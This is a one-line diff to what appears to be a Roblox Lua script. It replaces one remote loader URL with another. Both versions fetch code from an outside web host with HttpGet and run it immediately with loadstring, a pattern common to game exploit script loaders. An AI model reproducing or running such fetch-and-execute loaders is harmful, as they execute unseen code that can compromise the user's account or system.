@@ -1,1 +1,1 @@
-loadstring(game:HttpGet("https://lurvox-security.vercel.app/loader/script/UBCNXOXeNpbWyDVhxSmQj6Zo4sY5XHCr"))()
+loadstring(game:HttpGet("https://encrypt-x.pages.dev/Scripts?Id=4105069586758"))("4105069586758")
